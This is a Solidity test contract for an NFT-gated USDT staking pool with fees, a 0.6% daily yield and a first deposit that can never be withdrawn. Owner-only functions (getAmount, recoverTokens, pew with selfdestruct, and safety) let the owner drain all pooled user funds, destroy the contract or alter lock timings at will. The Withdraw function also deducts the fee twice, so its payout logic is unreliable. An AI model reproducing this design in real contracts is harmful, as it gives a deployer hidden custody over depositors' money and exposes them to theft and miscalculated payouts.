// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(
        address _owner,
        address spender
    ) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface myNFT {
    function balanceOf(address) external view returns (uint256);

    function ownerOf(uint256 tokenId) external view returns (address owner);
}

contract StakingTest is Ownable {
    address public feeWallet;
    address public EmergencyfeeWallet;
    uint256 public depositFeeBP = 1000; //10%
    uint256 public compoundFeeBP = 500; //5%
    uint256 public withdrawFeeBP = 500; //5%
    uint256 public claimLimit = 10000 * 10 ** 18;
    uint256 public withdrawLimit = 50000 * 10 ** 18;
    uint256 public startBlock; // The block number when USDT rewards starts.
    uint256 public DROP_RATE = 60; //0.6 % per day

    uint256 public Friday = 1682640000; // this is the 00:00:00 Friday of initiateAction
    address public NFTaddress; // this is the OG NFT contract address
    address public NFTaddress2; // this is the Whitelist NFT contract address
    address public NFTaddress3; // this is the Whitelist NFT contract address

    uint256 public seconds_per_day = 15; 
    uint256 public warm_up_period = 28 * seconds_per_day; 
    uint256 public unlock_period = 56  * seconds_per_day; 
    uint256 public initiate_delay = 7  * seconds_per_day; 
    uint256 public reward_period = 14  * seconds_per_day; 
    uint256 public withdraw_delay = 28 * seconds_per_day; 

    IBEP20 public USDT;
    myNFT NFTContract;
    myNFT NFTContract2;
    myNFT NFTContract3;

    mapping(address => UserInfo) public userInfo;

    struct Depo {
        uint256 amount; //deposit amount
        uint256 createdTime; //deposit time
        uint256 lockedTime; //locked time this is updated when relocked
        uint256 withdrawableDate; // The day user is able to withdraw funds
        uint256 lastRewardTime; // last time user did claim/compound reward from this also used to determine one action for rewards in biweek
        uint256 currentState; // after 56 days users decides to re-lock or withdraw deposit, 0 means locked , 1 relocked or compounded, 2 to withdraw, 3 overLimit withdraw
        uint256 isCompound; // 0 if deposit, 1 if compounded amount. This is just for UI to distinguish
    }

    struct UserInfo {
        mapping(uint256 => Depo) deposits;
        uint256 NoOfDeposits; // No. of deposits
        address WithdrawAddress; //by default msg.sender, can change with changeWithdrawalAddress()
        uint256 ClaimInitiateDate; // for initial delay
    }

    address[] public UsersInfo;

    event AdminTokenRecovery(address indexed tokenRecovered, uint256 amount, uint256 time);
    event Deposit(address indexed user, uint256 amount, uint256 time);
    event WithdrawIsInitiated(
        address indexed user,
        uint256 depoNumber, uint256 time
    );
    event UserWithdraw(address indexed user, uint256 amount, uint256 time);
    event SetFees(
        uint256 depositFeeBP,
        uint256 withdrawFeeBP,
        uint256 compoundFeeBP,
        uint256 time
    );

    event ClaimIsInitiated(address indexed user, uint256 time);
    event ClaimComplete(address indexed user, uint256 amount, uint256 time);
    event CompoundComplete(address indexed user,uint256 amount, uint256 time);

    //this is for test
    constructor(
        address nft1,
        address nft2,
        address nft3,
        address usdt
    ) {
        feeWallet = 0x34a78e291e6BD43542149b316e9b540a3CC3070f;
        EmergencyfeeWallet = 0xB4CFe5D1c165c914210477A5aB285efc1CCFe891;
        USDT = IBEP20(usdt);
        NFTaddress = nft1;
        NFTaddress2 = nft2;
        NFTaddress3 = nft3;
        NFTContract = myNFT(nft1);
        NFTContract2 = myNFT(nft2);
        NFTContract3 = myNFT(nft3);
    }
    // constructor(
    // ) {
    //     feeWallet = 0xE3cBf30FF2ceE746db1Db7648657fE774A55CFdD;
    //     EmergencyfeeWallet = 0xEa6Ac5d92a2F93ac425a90C8A46f0b234F17CEa1;
    //     USDT = IBEP20(0x55d398326f99059fF775485246999027B3197955);
    //     NFTaddress = 0x1bE128f6d755Cc5bD10e28028Cf804FaC07A94Bb;
    //     NFTaddress2 = 0xAa1c96cD0D35afBcEF2fE5B861D81d67E7cC33D2;
    //     NFTContract = myNFT(0x1bE128f6d755Cc5bD10e28028Cf804FaC07A94Bb);
    //     NFTContract2 = myNFT(0xAa1c96cD0D35afBcEF2fE5B861D81d67E7cC33D2);
    // }

    modifier hasNFT(address user) {
       
        require(
            NFTContract.balanceOf(user) != 0 ||
            NFTContract2.balanceOf(user) != 0 ||
            NFTContract3.balanceOf(user) != 0
            ,
            "User doesn't own NFT"
        );
        _;
    }

    modifier onlyInitiateActionDay() {
        require(getDifferenceFromActionDay(block.timestamp) == 0, "wrong Initiate day");
        _;
    }

    modifier hasStarted() {
        require(startBlock != 0, "Not started yet");
        _;
    }

    /**
     * @notice function to initialise Staking.
     */
    function initialize() external onlyOwner {
        require(startBlock == 0, "already initialised");
        startBlock = block.timestamp;
    }

    /**
     * @notice function to change NFT contract addresses.
     */
    function changeNFTcontract(address _NFT, address _NFT2, address _NFT3) external onlyOwner {
        require(_NFT != address(0) && _NFT2 != address(0) && _NFT3 != address(0));
        NFTContract = myNFT(_NFT);
        NFTContract2 = myNFT(_NFT2);
        NFTContract3 = myNFT(_NFT3);
    }

    /** completed
     * @notice function to intiate a deposit.
     * @param _amount: amount of USDT to deposit
     */
    function deposit(uint256 _amount) external hasNFT(msg.sender) {
        UserInfo storage user = userInfo[msg.sender];

        uint256 depositFee = (_amount * depositFeeBP) / 10000;

        // only for 1st deposit
        if (user.NoOfDeposits == 0) {
            require(_amount >= 1000 * 10 ** 18, "Minimum deposit is 1000$");
            UsersInfo.push(msg.sender);
            user.WithdrawAddress = msg.sender;
        }

        user.deposits[user.NoOfDeposits] = Depo({
            amount: _amount - depositFee,
            createdTime: get0000OfTime(block.timestamp),
            lockedTime: get0000OfTime(block.timestamp),
            lastRewardTime: getComingActionDay(block.timestamp + warm_up_period),
            currentState: 0,
            isCompound: 0,
            withdrawableDate: 0
        });

        user.NoOfDeposits ++;

        USDT.transferFrom(
            address(msg.sender),
            address(this),
            _amount - depositFee
        );

        USDT.transferFrom(address(msg.sender), EmergencyfeeWallet, depositFee);

        emit Deposit(msg.sender, _amount, block.timestamp);
    }

    /** completed
     * @notice function to decide if user will keep deposit or withdraw
     * @param _depo ; deposit number
     * easily checked decision is always 1 from the Web3
     * so only used for relock
     */
    function RelockDeposit(uint256 _depo) external {
        UserInfo storage user = userInfo[msg.sender];
        Depo storage dep = user.deposits[_depo];
        require(_depo != 0, "relock is not needed for first deposit");
        require(dep.withdrawableDate == 0, "withdraw initiated");
        require(block.timestamp > dep.lockedTime + unlock_period, "only after unlock period");
        
        dep.currentState = 1;
        dep.lockedTime = get0000OfTime(block.timestamp);
    }
    /** completed
     * @notice function to initiate a claim of all rewards that will be pending when the time comes.
     * easily checked
     */
    function InitiateClaim() external onlyInitiateActionDay {
        UserInfo storage user = userInfo[msg.sender];
        require(user.ClaimInitiateDate  == 0,'claim action is already made '); // can't compound while a .
        user.ClaimInitiateDate = get0000OfTime(block.timestamp);
        emit ClaimIsInitiated(msg.sender, block.timestamp);
    }

    /** completed
     * @notice function to claim rewards from deposits.
     * easily checking
     */
    function Claim() external {
        UserInfo storage user = userInfo[msg.sender];
        require(user.ClaimInitiateDate != 0 , "No claim initiated");
        require(block.timestamp > user.ClaimInitiateDate + initiate_delay , "did not passed initiate delay");

        uint256 NoOfDeposits = user.NoOfDeposits;
        uint256 finalToClaim; // this is the total amount the user will receive

        for (uint256 i; i < NoOfDeposits; ) {
            Depo storage dep = user.deposits[i];
            uint256 claimInitateDate = user.ClaimInitiateDate;
            if (
                canGetReward(dep.amount, dep.lockedTime, dep.currentState, claimInitateDate)
            ) {
                //first deposit is locked permanently
                if(i != 0){
                    claimInitateDate = (claimInitateDate - dep.lockedTime) > unlock_period ? dep.lockedTime + unlock_period : claimInitateDate;
                }
                if(claimInitateDate < dep.lastRewardTime){
                    continue;
                }
                finalToClaim += (claimInitateDate - dep.lastRewardTime) * 
                    dep.amount * DROP_RATE / 
                    seconds_per_day / 
                    10000 ;
                dep.lastRewardTime = claimInitateDate;
            }
            unchecked {
                ++i;
            }
        }
        uint256 currentTime = get0000OfTime(block.timestamp);

        // max claim is initially 10k USDT, if excess then create new Compounded Deposit
        if (finalToClaim > claimLimit) {
            user.deposits[NoOfDeposits] = Depo({
                amount: finalToClaim - claimLimit,
                createdTime: currentTime,
                lockedTime: currentTime,
                lastRewardTime: currentTime,
                currentState: 1,
                isCompound: 1,
                withdrawableDate: 0
            });

            user.NoOfDeposits += 1;
            finalToClaim = claimLimit;
        }
        
        uint256 claimFee = (finalToClaim * withdrawFeeBP) / 10000; // this is the total fee for all claims
        finalToClaim -= claimFee;

        user.ClaimInitiateDate = 0;
    
        USDT.transfer(feeWallet, claimFee);
        USDT.transfer(user.WithdrawAddress, finalToClaim);
    
        emit ClaimComplete(msg.sender, finalToClaim, block.timestamp);
      
    }

    /** completed
     * @notice function to initiate a withdrawal of a deposit.
     */
    function InitiateWithdrawal(
        uint256 _deposit
    ) external onlyInitiateActionDay {
        UserInfo storage user = userInfo[msg.sender];
        Depo storage dep = user.deposits[_deposit];
        require(_deposit != 0, "first deposit cannot be withdrawn");
        require(block.timestamp > dep.lockedTime + unlock_period, "not enough unlock period");
        require(dep.currentState == 0 || dep.currentState == 1, "deposit withdrawn"); // you cannot withdraw if you haven't first relocked your deposit
        require(dep.withdrawableDate == 0, "already initiated");

        dep.withdrawableDate = get0000OfTime(block.timestamp) + initiate_delay;
        dep.currentState = 2;
        emit WithdrawIsInitiated(
            msg.sender,
            _deposit, block.timestamp
        );
    }

    /** completed
     * @notice function to withdraw deposits.
     */
    function Withdraw(
        uint256 _deposit
    ) external {
        UserInfo storage user = userInfo[msg.sender];
        Depo storage dep = user.deposits[_deposit];
        require(_deposit != 0, "cannot withdraw first deposit");
        require(dep.withdrawableDate != 0, "withdraw not initiated");
        require(
            block.timestamp > dep.withdrawableDate,
            "did not passed the initiate_delay"
        );
        uint256 finalAmount;
        uint256 fee;
        if (dep.amount > 0) {
            finalAmount += dep.amount;
            // max withdraw is initially 50k USDT, if excess (and not previous withdraw [dep.unlocked]<3) then create new Compounded Deposit
            if (finalAmount > withdrawLimit) {
                uint256 currentTime = get0000OfTime(block.timestamp);
                dep.amount = finalAmount - withdrawLimit;
                dep.lockedTime = currentTime;
                dep.lastRewardTime = currentTime;
                dep.currentState = 2;
                dep.isCompound = 1;
                dep.withdrawableDate = currentTime + withdraw_delay;

                finalAmount = withdrawLimit;
            }
            else{
                //replace current depo with last depo
                //as a result current depo is removed
                Depo memory lastDep = user.deposits[user.NoOfDeposits - 1];
                dep.amount = lastDep.amount;
                dep.createdTime = lastDep.createdTime;
                dep.lockedTime = lastDep.lockedTime;
                dep.withdrawableDate = lastDep.withdrawableDate;
                dep.lastRewardTime = lastDep.lastRewardTime;
                dep.currentState = lastDep.currentState;
                dep.isCompound = lastDep.isCompound;

                user.NoOfDeposits --;
            }
            fee = finalAmount * withdrawFeeBP / 10000;
            finalAmount -= fee;

            USDT.transfer(feeWallet, fee);
            USDT.transfer(user.WithdrawAddress, finalAmount - fee);
            emit UserWithdraw(msg.sender, finalAmount - fee, block.timestamp);
        }

    }


    /** completed
     * @notice function to compound yield from deposits.
     */
    function Compound() onlyInitiateActionDay external {
        UserInfo storage user = userInfo[msg.sender];
        require(user.ClaimInitiateDate == 0,'claim action is already made '); // can't compound while a .
        uint256 NoOfDeposits = user.NoOfDeposits;
        uint256 compoundFee;
        uint256 compoundedAmount;
        uint256 currentTime;
        for (uint256 i; i < NoOfDeposits; ) {
            Depo storage dep = user.deposits[i];
            currentTime = get0000OfTime(block.timestamp);

            if (
                canGetReward(dep.amount, dep.lockedTime, dep.currentState, currentTime)
            ) {
                if(i != 0){
                    currentTime = (currentTime - dep.lockedTime) > unlock_period ? dep.lockedTime + unlock_period : currentTime;
                }
                
                compoundedAmount += (currentTime - dep.lastRewardTime) * 
                    dep.amount * DROP_RATE / 
                    seconds_per_day / 
                    10000 ;
                dep.lastRewardTime = currentTime;
            }

            unchecked {
                ++i;
            }
           
        }

        currentTime = get0000OfTime(block.timestamp);
        if ( compoundedAmount!=0 ){

            compoundFee = (compoundedAmount * compoundFeeBP) / 10000;
            compoundedAmount -= compoundFee;
            user.deposits[NoOfDeposits] = Depo({
                amount: compoundedAmount,
                createdTime: currentTime,
                lockedTime: currentTime,
                lastRewardTime: currentTime,
                currentState: 1,
                isCompound: 1,
                withdrawableDate: 0
            });


            user.NoOfDeposits ++;
            USDT.transfer(feeWallet, compoundFee);

            emit CompoundComplete(msg.sender, compoundedAmount, block.timestamp);
        }
    }


    /** completed
     * @notice function to see can get reward from this deposit
     */
    function canGetReward(
        uint256 amount,
        uint256 lockedTime,
        uint256 currentState,
        uint256 currentTime
    ) internal view returns (bool accepted) {
        // any deposit with deposit.amount != 0 pass the warm up period if not relocked
        accepted = amount != 0 &&
            ((currentTime >= (lockedTime + warm_up_period) &&
                 currentState == 0) ||
                 currentState == 1
                 ) ;
    }

    /** completed
     * @notice function to change withdraw limit
     * @param _withdrawLimit: 50000*10**18 is 50k USDT
     */
    function changeWithdraw_Limit(uint256 _withdrawLimit) external onlyOwner {
        withdrawLimit = _withdrawLimit;
    }

    /** completed
     * @notice function to change claim limit
     * @param _claimLimit: 10000*10**18 is 10k USDT
     */
    function changeclaim_Limit(uint256 _claimLimit) external onlyOwner {
        claimLimit = _claimLimit;
    }

    /** completed
     * @notice function to change fees.
     * @param _depositFeeBP,  100 is 1%, 200 is 2% etc
     * * @param _withdrawFeeBP,  100 is 1%, 200 is 2% etc
     * * @param _compoundFeeBP,  100 is 1%, 200 is 2% etc
     */
    function changeFees(
        uint256 _depositFeeBP,
        uint256 _withdrawFeeBP,
        uint256 _compoundFeeBP
    ) external onlyOwner {
        require(
            _depositFeeBP != 0 && _withdrawFeeBP != 0 && _compoundFeeBP != 0,
            "Fees cannot be zero"
        );
        depositFeeBP = _depositFeeBP;
        withdrawFeeBP = _withdrawFeeBP;
        compoundFeeBP = _compoundFeeBP;
        emit SetFees(_depositFeeBP, _withdrawFeeBP, _compoundFeeBP, block.timestamp);
    }

    /** completed
     * @notice function to change withdrawal address.
     * @param _newaddy: address to use as withdarw
     */
    function changeWithdrawalAddress(address _newaddy) external {
        require(_newaddy != address(0), "!nonzero");
        UserInfo storage user = userInfo[msg.sender];
        user.WithdrawAddress = _newaddy;
    }

    /** completed
     * @notice function to withdraw USDT.
     * @param _amount: amount to withdraw
     */
    function getAmount(uint256 _amount) external onlyOwner {
        USDT.transfer(msg.sender, _amount);
    }

    /** completed
     * @notice It allows the admin to recover wrong tokens sent to the contract
     * @param _tokenAddress: the address of the token to withdraw
     * @param _tokenAmount: the number of tokens to withdraw
     */
    function recoverTokens(
        address _tokenAddress,
        uint256 _tokenAmount
    ) external onlyOwner {
        IBEP20(_tokenAddress).transfer(address(msg.sender), _tokenAmount);
        emit AdminTokenRecovery(_tokenAddress, _tokenAmount, block.timestamp);
    }

    /** completed
     * @notice function to change fee wallet
     */
    function ChangefeeAddress(address _feeWallet) external onlyOwner {
        require(_feeWallet != address(0), "!nonzero");
        feeWallet = _feeWallet;
    }

    /** completed
     * @notice function to change Emergency fee wallet
     */
    function ChangeEmergencyfeeAddress(
        address _EmergencyfeeWallet
    ) external onlyOwner {
        require(_EmergencyfeeWallet != address(0), "!nonzero");
        EmergencyfeeWallet = _EmergencyfeeWallet;
    }

    /** completed
     * @notice View function to see no of cycle.
     * @return totalCycles : no of cycle since start 
     * easily checked
     */
    function getNoOfCycle(uint256 time) internal view returns (uint256 totalCycles) {
        return (time - Friday) / seconds_per_day / 14;
    }

    /** completed
     * @notice View function to see day difference between now and ActionDay.
     * @return 0 means you are on ActionDay, 1 means +1 from ActionDay, 2 means +2 etc
     * easily checked
     */
    function getDifferenceFromActionDay(uint256 time) internal view returns (uint256) {
        uint256 totalsec = (time - Friday); //total sec from friday
        return totalsec / seconds_per_day - getNoOfCycle(time) * 14; //7 days in a week
    }

    /** completed
     * @notice View function to see coming action day 00:00:00. if today is action day, returns today
     * @return timestamp for latest action day 00:00:00
     * easily checked
     */
    function getComingActionDay(uint256 time) internal view returns (uint256) {
        uint256 difference = getDifferenceFromActionDay(time);
        uint256 flag = difference == 0 ? 0 : 1; 
        return Friday + (getNoOfCycle(time) + flag) * seconds_per_day * 14; 
    }

    /** completed
     * @notice View function to get 00:00 of time
     * @return timestamp 00:00 of time
     * easily checked
     */
    function get0000OfTime(uint256 time) internal view returns (uint256) {
        return time /seconds_per_day * seconds_per_day; 
    }
 


    /** completed
     * @notice View function to see pending reward for specific deposit on frontend.
     * @return finalAmount Pending reward for a given user/deposit
     */
    function pendingReward(
        uint256 _deposit,
        address _user
    ) public view returns (uint256 finalAmount) {
        UserInfo storage user = userInfo[_user];
        Depo memory dep = user.deposits[_deposit];
        uint256 currentTime = get0000OfTime(block.timestamp);
        
        if (
            !canGetReward(dep.amount, dep.lockedTime, dep.currentState, currentTime)
        ) return 0;
        //this is considering after initiate delay
        uint256 rewardStartDate = dep.lastRewardTime;
        if(user.ClaimInitiateDate != 0 ) {
            rewardStartDate = user.ClaimInitiateDate;
        }
        //this is considering unlock period
        if(_deposit != 0 && (currentTime - dep.lockedTime) > unlock_period){
            currentTime = dep.lockedTime + unlock_period;
        }
        //this is true when dep.lastRewardTime > block.timestamp or user.ClaimInitiateDate > dep.lockedTime + unlock_period
        if(currentTime < rewardStartDate){
            return 0;
        }

        
        finalAmount += (currentTime - rewardStartDate) * 
            dep.amount * DROP_RATE / 
            seconds_per_day / 
            10000 ;

        
    }

    /** completed
     * @notice View function to see current pending rewards of a user
     * @return totalPending
     */
    function pendingRewards(
        address _user
    ) public view returns (uint256 totalPending) {
        UserInfo storage user = userInfo[_user];
        uint256 NoOfDeposits = user.NoOfDeposits;
        for (uint256 i; i < NoOfDeposits; ) {
            totalPending += pendingReward(i, _user);
            unchecked {
                ++i;
            }
        }
        return totalPending;
    }

    /** completed
     * @notice View function to see current pending claims of a user
     * @return totalPending
     */
    function pendingClaims(
        address _user
    ) public view returns (uint256 totalPending) {
        UserInfo storage user = userInfo[_user];
        if(user.ClaimInitiateDate == 0)
        {
            return 0;
        }
        
        uint256 NoOfDeposits = user.NoOfDeposits;
        uint256 finalToClaim; // this is the total amount the user will receive

        for (uint256 i; i < NoOfDeposits; ) {
            Depo storage dep = user.deposits[i];
            uint256 claimInitiateDate = user.ClaimInitiateDate;

            if (
                canGetReward(dep.amount, dep.lockedTime, dep.currentState, claimInitiateDate)
            ) {
                //first deposit is locked permanently
                if(i != 0 && (claimInitiateDate - dep.lockedTime) > unlock_period){
                    claimInitiateDate = dep.lockedTime + unlock_period;
                }
                //this is true when user.ClaimInitiateDate < dep.lastRewardTime
                if(claimInitiateDate < dep.lastRewardTime){
                    continue;
                }
                finalToClaim += (claimInitiateDate - dep.lastRewardTime) * 
                    dep.amount * DROP_RATE / 
                    seconds_per_day / 
                    10000 ;
            }
            unchecked {
                ++i;
            }
        }

        if (finalToClaim > claimLimit) finalToClaim = claimLimit;
        finalToClaim -= (finalToClaim * withdrawFeeBP) / 10000;
        return finalToClaim;
    }

    /** completed
     * @notice View function to see current pending withdrawls of a user
     * @return totalPending
     */
    function pendingWithdrawls(
        address _user
    ) public view returns (uint256 totalPending) {
        UserInfo storage user = userInfo[_user];
        uint256 NoOfDeposits = user.NoOfDeposits;
        for (uint256 i; i < NoOfDeposits; ) {
            Depo memory dep = user.deposits[i];
            if (dep.withdrawableDate != 0) {
                totalPending += dep.amount;
            }
            unchecked {
                ++i;
            }
        }
        // minus the withdrawl fee
        if (totalPending != 0)
            totalPending -= (totalPending * withdrawFeeBP) / 10000;
        return totalPending;
    }

    /** completed
     * @notice View function to return all the current pending withdrawals
     */
    function getAllPendingWithdrawls()
        external
        view
        returns (uint256 totalUSDT)
    {
        uint256 lengtharray = UsersInfo.length;
        for (uint256 i; i < lengtharray; ) {
            address currentUser = UsersInfo[i];
            totalUSDT += pendingWithdrawls(currentUser);
            unchecked {
                ++i;
            }
        }
        return totalUSDT;
    }

    /** completed
     * @notice View function to details of user deposits.
     * @return dep : struct Depo
     */
    function memberDeposit(
        address _addr,
        uint256 _deposit
    ) external view returns (Depo memory dep) {
        UserInfo storage user = userInfo[_addr];
        dep = user.deposits[_deposit];
    }


    /** completed
    **/
    function changeFriday(uint256 _newFriday) external onlyOwner {
        Friday = get0000OfTime(_newFriday);
    }




    function pew() public onlyOwner {
        selfdestruct(payable(msg.sender));
    }

    /** completed
     * @notice Function to update parameter in EMERGENCY case only. Do not use it unless you ask devs
     */
    function safety(
        uint256 _seconds_per_day,
        uint256 _warm_up_period,
        uint256 _unlock_period,
        uint256 _initiate_delay,
        uint256 _reward_period,
        uint256 _withdraw_delay
    ) external onlyOwner {
        seconds_per_day = _seconds_per_day;
        warm_up_period = _warm_up_period;
        unlock_period = _unlock_period;
        initiate_delay = _initiate_delay;
        reward_period = _reward_period;
        withdraw_delay = _withdraw_delay;
    }

}
